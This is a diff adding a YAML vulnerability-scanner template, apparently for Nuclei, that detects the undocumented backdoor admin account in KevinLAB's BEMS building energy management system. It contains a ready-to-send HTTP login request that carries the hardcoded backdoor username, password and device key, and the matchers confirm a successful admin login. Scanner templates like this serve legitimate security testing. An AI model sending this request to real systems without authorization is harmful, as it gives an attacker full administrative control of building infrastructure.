@@ -1,0 +1,40 @@
+id: kevinlab-bems-backdoor
+
+info:
+  name: KevinLAB BEMS (Building Energy Management System) Undocumented Backdoor Account
+  author: gy741
+  severity: critical
+  description: The BEMS solution has an undocumented backdoor account, and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the
+    RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users
+    settings in the admin panel, and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the BEMS is offering remotely.
+  reference:
+    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php
+  tags: kevinlab,backdoor
+
+requests:
+  - raw:
+      - |
+        POST /http/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22kevinlab%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22kevin003%22%7D%2C%7B%22name%22%3A%22device_key%22%2C%22value%22%3A%22a2fe6b53-e09d-46df-8c9a-e666430e163e%22%7D%2C%7B%22name%22%3A%22auto_login%22%2C%22value%22%3Afalse%7D%2C%7B%22name%22%3A%22login_key%22%2C%22value%22%3A%22%22%7D%5D
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - 'data":"[A-Za-z0-9-]+'
+          - 'login_key":"[A-Za-z0-9-]+'
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - '"result":true'
+        part: body
+
+      - type: status
+        status:
+          - 200
